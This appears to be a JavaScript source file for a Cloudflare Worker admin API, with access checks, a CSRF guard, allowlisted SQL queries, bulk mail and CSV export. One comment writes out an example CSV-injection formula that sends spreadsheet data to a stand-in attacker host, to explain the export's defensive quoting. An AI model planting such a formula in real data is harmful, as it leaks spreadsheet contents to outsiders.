/**
 * Admin JSON API — protected by Cloudflare Access.
 *
 * Every route requires a valid `Cf-Access-Jwt-Assertion` (verified in
 * ../access.js). When Access is not configured the Worker fails closed and
 * returns 401 for all admin requests. State-changing methods (POST/PATCH/
 * DELETE) additionally pass a CSRF guard (`csrfReject`): JSON-only content
 * type plus same-origin fetch-metadata checks, so a cross-site form POST
 * cannot reach e.g. the mass-mail route.
 *
 *   GET    /api/admin/me
 *   GET    /api/admin/summary
 *   GET    /api/admin/export?table=<collection>     CSV download
 *   POST   /api/admin/mail/send                     { subject, html_body }
 *   GET    /api/admin/:collection                   ?status=&q=&limit=&offset=
 *   PATCH  /api/admin/:collection/:id               { status?, notes? }
 *   PATCH  /api/admin/:collection/status            { ids: [...], status }
 *   DELETE /api/admin/:collection/:id
 *
 * Table and column identifiers are never taken from user input: `:collection`
 * is resolved against the `COLLECTIONS` allowlist, search columns come from the
 * same allowlist, and ids are validated as integers. All values are bound
 * parameters.
 */

import { json, methodNotAllowed, optionsResponse } from "../lib/json.js";
import { asInt, clean, readBody } from "../lib/validate.js";
import { verifyAccess } from "../access.js";
import { sendToAll } from "../lib/mailing.js";

/**
 * Allowlist of collections that may be listed, updated, or deleted.
 *   `reviewedAt` — carries a `reviewed_at` column (stamped on status change).
 *   `search`     — text columns used by the `q` filter (identifiers only).
 *   `statuses`   — allowed `status` values, when a collection constrains them.
 */
const COLLECTIONS = {
  applications: {
    table: "applications",
    reviewedAt: true,
    search: ["name", "email", "building", "location", "disciplines"],
  },
  problems: {
    table: "problems",
    reviewedAt: true,
    search: ["title", "description", "submitter_name", "email", "location", "slug"],
    // new | framed | parked | declined | active | solved (see migrations/0001).
    statuses: ["new", "framed", "parked", "declined", "active", "solved"],
  },
  projects: {
    table: "projects",
    reviewedAt: true,
    search: ["title", "one_liner", "description", "lead_name", "lead_email", "slug"],
  },
  contact_messages: {
    table: "contact_messages",
    reviewedAt: false,
    search: ["name", "email", "subject", "message"],
  },
  suggestions: {
    table: "suggestions",
    reviewedAt: false,
    search: ["topic", "body", "name", "email"],
  },
  feedback: {
    table: "feedback",
    reviewedAt: false,
    search: ["body", "page", "email"],
  },
  subscribers: {
    table: "subscribers",
    reviewedAt: false,
    search: ["email", "name"],
    statuses: ["active", "unsubscribed", "bounced"],
  },
};

/** Hard cap on rows included in a CSV export. */
const EXPORT_LIMIT = 5000;

/** Hard cap on ids accepted by a bulk status update. */
const BULK_LIMIT = 500;

const METHODS = "GET, PATCH, DELETE, OPTIONS";

/**
 * Entry point for `/api/admin/*`.
 *
 * @param {Request} request
 * @param {{DB: D1Database}} env
 * @param {ExecutionContext} ctx
 * @param {URL} url
 * @returns {Promise<Response>}
 */
export async function handleAdmin(request, env, ctx, url) {
  // Answer preflight before auth so browsers get a clean 204. Genuine
  // cross-origin callers get no ACAO header and are blocked by the browser.
  if (request.method === "OPTIONS") {
    return optionsResponse(METHODS, request, url);
  }

  const auth = await verifyAccess(request, env);
  if (!auth.ok) {
    return json({ ok: false, error: "unauthorized" }, 401);
  }

  // CSRF guard for state-changing methods (defence in depth behind Access).
  // `application/x-www-form-urlencoded` is a CORS "simple request" (no
  // preflight), so a cross-site <form> POST would otherwise reach the
  // handlers below with the user's Access cookies attached and no custom
  // headers. GET/HEAD/OPTIONS are reads and pass through untouched.
  const csrfError = csrfReject(request, url);
  if (csrfError) return csrfError;

  const parts = url.pathname
    .slice("/api/admin/".length)
    .split("/")
    .filter(Boolean);

  // GET /api/admin/me
  if (parts.length === 1 && parts[0] === "me") {
    if (request.method !== "GET") return methodNotAllowed("GET, OPTIONS");
    return json({ ok: true, email: auth.email });
  }

  // GET /api/admin/summary
  if (parts.length === 1 && parts[0] === "summary") {
    if (request.method !== "GET") return methodNotAllowed("GET, OPTIONS");
    return summary(env);
  }

  // GET /api/admin/export?table=<collection>
  if (parts.length === 1 && parts[0] === "export") {
    if (request.method !== "GET") return methodNotAllowed("GET, OPTIONS");
    return exportCsv(env, url);
  }

  // POST /api/admin/mail/send  { subject, html_body }
  // Bulk-send to every active subscriber. Admin/Access gated. Best-effort:
  // returns real sent/failed counts so the operator sees exactly what happened.
  if (parts.length === 2 && parts[0] === "mail" && parts[1] === "send") {
    if (request.method !== "POST") return methodNotAllowed("POST, OPTIONS");
    return sendMail(request, env);
  }

  const collection = COLLECTIONS[parts[0]];
  if (!collection) return json({ ok: false, error: "not_found" }, 404);

  // GET /api/admin/:collection
  if (parts.length === 1) {
    if (request.method !== "GET") return methodNotAllowed("GET, OPTIONS");
    return list(env, url, collection);
  }

  // PATCH /api/admin/:collection/status  { ids: [...], status }
  if (parts.length === 2 && parts[1] === "status") {
    if (request.method !== "PATCH") return methodNotAllowed("PATCH, OPTIONS");
    return bulkStatus(request, env, collection);
  }

  // PATCH / DELETE /api/admin/:collection/:id
  if (parts.length === 2) {
    const id = asInt(parts[1], { min: 1 });
    if (id === null) return json({ ok: false, error: "invalid_id" }, 400);

    if (request.method === "PATCH") return update(request, env, collection, id);
    if (request.method === "DELETE") return remove(env, collection, id);
    return methodNotAllowed("PATCH, DELETE, OPTIONS");
  }

  return json({ ok: false, error: "not_found" }, 404);
}

/**
 * Reject cross-site state-changing requests (CSRF guard).
 *
 * Two independent checks, applied to POST/PATCH/DELETE only:
 *
 *   1. JSON-only content type. An HTML form can only POST
 *      `application/x-www-form-urlencoded`, so requiring `application/json`
 *      breaks cross-site form submissions at the parser level (415).
 *      DELETE is treated as body-less when it declares no content-type at
 *      all — the dashboard's DELETEs are bodiless, and forms cannot send
 *      DELETE anyway — but a declared non-JSON type is still rejected.
 *
 *   2. Fetch metadata. Browsers send `Sec-Fetch-Site` on every request; only
 *      `same-origin` may change state (403). When that header is absent
 *      (older browsers, non-browser API clients), a present `Origin` header
 *      must equal this request's origin. Non-browser callers (curl, scripts)
 *      carry Access tokens but no ambient cookie-based CSRF risk and are
 *      unaffected as long as they send JSON.
 *
 * @param {Request} request
 * @param {URL} url
 * @returns {Response|null} 415/403 response, or null when the request passes.
 */
function csrfReject(request, url) {
  const method = request.method;
  if (method !== "POST" && method !== "PATCH" && method !== "DELETE") {
    return null;
  }

  const contentType = (request.headers.get("content-type") || "")
    .split(";")[0]
    .trim()
    .toLowerCase();
  const bodylessDelete = method === "DELETE" && !contentType;
  if (!bodylessDelete && contentType !== "application/json") {
    return json({ ok: false, error: "unsupported_content_type" }, 415);
  }

  const site = request.headers.get("sec-fetch-site");
  if (site && site !== "same-origin") {
    return json({ ok: false, error: "cross_site_request" }, 403);
  }

  const origin = request.headers.get("origin");
  if (origin && origin !== url.origin) {
    return json({ ok: false, error: "cross_site_request" }, 403);
  }

  return null;
}

/* ------------------------------------------------------------------ */
/* Handlers                                                             */
/* ------------------------------------------------------------------ */

/** Counts per collection and per status. */
async function summary(env) {
  const result = {};

  for (const [name, config] of Object.entries(COLLECTIONS)) {
    const totalRow = await env.DB.prepare(
      `SELECT COUNT(*) AS n FROM ${config.table}`,
    ).first();

    const { results } = await env.DB.prepare(
      `SELECT status, COUNT(*) AS n FROM ${config.table} GROUP BY status`,
    ).all();

    const byStatus = {};
    for (const row of results ?? []) {
      byStatus[row.status ?? "unknown"] = row.n;
    }

    result[name] = { total: totalRow?.n ?? 0, status: byStatus };
  }

  return json({ ok: true, summary: result });
}

/**
 * List a collection with optional status filter, free-text search, and
 * pagination. All identifiers come from the `COLLECTIONS` allowlist; every
 * value is a bound parameter.
 *
 * @param {{DB: D1Database}} env
 * @param {URL} url
 * @param {{table: string, reviewedAt: boolean, search: string[]}} config
 * @returns {Promise<Response>}
 */
async function list(env, url, config) {
  const limit = asInt(url.searchParams.get("limit"), {
    min: 1,
    max: 500,
    fallback: 100,
  });
  const offset = asInt(url.searchParams.get("offset"), {
    min: 0,
    max: 10_000_000,
    fallback: 0,
  });
  const status = clean(url.searchParams.get("status"), 40);
  const q = clean(url.searchParams.get("q"), 120);

  const { clauses, binds } = buildFilter(config, { status, q });
  const where = clauses.length ? `WHERE ${clauses.join(" AND ")}` : "";

  const totalRow = await env.DB.prepare(
    `SELECT COUNT(*) AS n FROM ${config.table} ${where}`,
  )
    .bind(...binds)
    .first();

  const { results } = await env.DB.prepare(
    `SELECT * FROM ${config.table} ${where} ORDER BY created_at DESC, id DESC LIMIT ? OFFSET ?`,
  )
    .bind(...binds, limit, offset)
    .all();

  return json({
    ok: true,
    items: results ?? [],
    total: totalRow?.n ?? 0,
    limit,
    offset,
  });
}

/**
 * Build a parameterised `WHERE` fragment from the optional filters.
 *
 * @param {{search: string[]}} config
 * @param {{status: string, q: string}} filters
 * @returns {{clauses: string[], binds: unknown[]}}
 */
function buildFilter(config, { status, q }) {
  const clauses = [];
  const binds = [];

  if (status) {
    clauses.push("status = ?");
    binds.push(status);
  }

  if (q && config.search.length) {
    const pattern = likePattern(q);
    clauses.push(
      `(${config.search.map((col) => `${col} LIKE ? ESCAPE '\\'`).join(" OR ")})`,
    );
    for (const _col of config.search) binds.push(pattern);
  }

  return { clauses, binds };
}

/**
 * Escape `\`, `%`, and `_` in a user string so it matches literally inside a
 * `LIKE ... ESCAPE '\'` comparison.
 *
 * @param {string} value
 * @returns {string}
 */
function likePattern(value) {
  const escaped = String(value).replace(/[\\%_]/g, (ch) => `\\${ch}`);
  return `%${escaped}%`;
}

/**
 * Update a row's `status` and/or `notes`. When `status` changes on a
 * review-aware collection we also stamp `reviewed_at`.
 *
 * @param {Request} request
 * @param {{DB: D1Database}} env
 * @param {{table: string, reviewedAt: boolean, statuses?: string[]}} config
 * @param {number} id
 * @returns {Promise<Response>}
 */
async function update(request, env, config, id) {
  const parsed = await readBody(request);
  if (!parsed.ok) return json({ ok: false, error: parsed.error }, parsed.status);
  const body = parsed.body;

  const sets = [];
  const binds = [];
  let statusChanged = false;

  if (body.status !== undefined) {
    const status = clean(body.status, 40);
    if (!status) return json({ ok: false, error: "invalid", fields: ["status"] }, 422);
    if (config.statuses && !config.statuses.includes(status)) {
      return json({ ok: false, error: "invalid", fields: ["status"] }, 422);
    }
    sets.push("status = ?");
    binds.push(status);
    statusChanged = true;
  }

  if (body.notes !== undefined) {
    sets.push("notes = ?");
    binds.push(clean(body.notes, 10000));
  }

  if (!sets.length) {
    return json({ ok: false, error: "invalid", fields: ["status", "notes"] }, 422);
  }

  if (statusChanged && config.reviewedAt) {
    sets.push("reviewed_at = datetime('now')");
  }

  binds.push(id);

  await env.DB.prepare(
    `UPDATE ${config.table} SET ${sets.join(", ")} WHERE id = ?`,
  )
    .bind(...binds)
    .run();

  return json({ ok: true });
}

/**
 * Apply one status to many rows at once.
 * `PATCH /api/admin/:collection/status` with `{ ids: [1,2,...], status }`.
 *
 * @param {Request} request
 * @param {{DB: D1Database}} env
 * @param {{table: string, reviewedAt: boolean, statuses?: string[]}} config
 * @returns {Promise<Response>}
 */
async function bulkStatus(request, env, config) {
  const parsed = await readBody(request);
  if (!parsed.ok) return json({ ok: false, error: parsed.error }, parsed.status);
  const body = parsed.body;

  const status = clean(body.status, 40);
  if (!status) return json({ ok: false, error: "invalid", fields: ["status"] }, 422);
  if (config.statuses && !config.statuses.includes(status)) {
    return json({ ok: false, error: "invalid", fields: ["status"] }, 422);
  }

  const rawIds = Array.isArray(body.ids) ? body.ids : [];
  const ids = rawIds
    .map((value) => asInt(value, { min: 1 }))
    .filter((value) => value !== null)
    .slice(0, BULK_LIMIT);
  if (!ids.length) return json({ ok: false, error: "invalid", fields: ["ids"] }, 422);

  const placeholders = ids.map(() => "?").join(", ");
  const sets = ["status = ?"];
  const binds = [status];
  if (config.reviewedAt) sets.push("reviewed_at = datetime('now')");
  binds.push(...ids);

  await env.DB.prepare(
    `UPDATE ${config.table} SET ${sets.join(", ")} WHERE id IN (${placeholders})`,
  )
    .bind(...binds)
    .run();

  return json({ ok: true, updated: ids.length });
}

/**
 * Hard-delete a row.
 *
 * @param {{DB: D1Database}} env
 * @param {{table: string}} config
 * @param {number} id
 * @returns {Promise<Response>}
 */
async function remove(env, config, id) {
  await env.DB.prepare(`DELETE FROM ${config.table} WHERE id = ?`)
    .bind(id)
    .run();
  return json({ ok: true });
}

/**
 * Bulk-send an email to every active subscriber.
 * `POST /api/admin/mail/send`  body: { subject, html_body }
 *
 * Access-gated by `handleAdmin`. Never throws: `sendToAll` reports per-address
 * outcomes, so the response carries the real sent/failed/active counts rather
 * than a rounded "success". Requires `RESEND_API_KEY`; without it every send
 * is skipped and the response says so explicitly.
 *
 * @param {Request} request
 * @param {{DB: D1Database, RESEND_API_KEY?: string}} env
 * @returns {Promise<Response>}
 */
async function sendMail(request, env) {
  const parsed = await readBody(request);
  if (!parsed.ok) return json({ ok: false, error: parsed.error }, parsed.status);

  const subject = clean(parsed.body.subject, 200);
  const htmlBody = clean(parsed.body.html_body, 100_000);
  if (!subject) return json({ ok: false, error: "invalid_subject" }, 400);
  if (!htmlBody) return json({ ok: false, error: "invalid_body" }, 400);

  if (!env.RESEND_API_KEY) {
    return json(
      { ok: false, error: "mail_not_configured", detail: "RESEND_API_KEY is not set" },
      503,
    );
  }

  const result = await sendToAll(env, { subject, html_body: htmlBody });
  return json({
    ok: result.totalFailed === 0,
    ...result,
  });
}

/**
 * Export one collection as CSV.
 * `GET /api/admin/export?table=<collection>`; the table name is allowlisted.
 *
 * @param {{DB: D1Database}} env
 * @param {URL} url
 * @returns {Promise<Response>}
 */
async function exportCsv(env, url) {
  const requested = clean(url.searchParams.get("table"), 40);
  const config = COLLECTIONS[requested];
  if (!config) return json({ ok: false, error: "invalid_table" }, 400);

  const { results } = await env.DB.prepare(
    `SELECT * FROM ${config.table} ORDER BY created_at DESC, id DESC LIMIT ?`,
  )
    .bind(EXPORT_LIMIT)
    .all();

  const rows = results ?? [];
  const columns = rows.length ? Object.keys(rows[0]) : [];
  const lines = [columns.join(",")];
  for (const row of rows) {
    lines.push(columns.map((col) => csvCell(row[col])).join(","));
  }
  const csv = `${lines.join("\r\n")}\r\n`;

  return new Response(csv, {
    status: 200,
    headers: {
      "content-type": "text/csv; charset=utf-8",
      "content-disposition": `attachment; filename="${config.table}.csv"`,
      "x-robots-tag": "noindex",
    },
  });
}

/**
 * Encode one CSV cell, quoting when it contains a comma, quote, or newline.
 *
 * CSV-injection guard: a cell whose first character is `=`, `+`, `-`, `@`, TAB,
 * or CR is a formula/command trigger in Excel, Google Sheets, and some BI
 * tools. A public form field like `=HYPERLINK("https://evil.example?x="&A1,"y")`
 * would otherwise execute when a steward opens the export (data exfiltration,
 * and DDE RCE in some Excel builds). Prefixing such a cell with a single quote
 * is the standard mitigation; the quote is applied BEFORE the comma/quote
 * escaping below so it lands inside any surrounding quotes. This is a spooled
 * export, so turning a leading `-`/`+` on a number into text is acceptable and
 * does not break the CSV structure.
 *
 * @param {unknown} value
 * @returns {string}
 */
function csvCell(value) {
  if (value === null || value === undefined) return "";
  let s = String(value);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
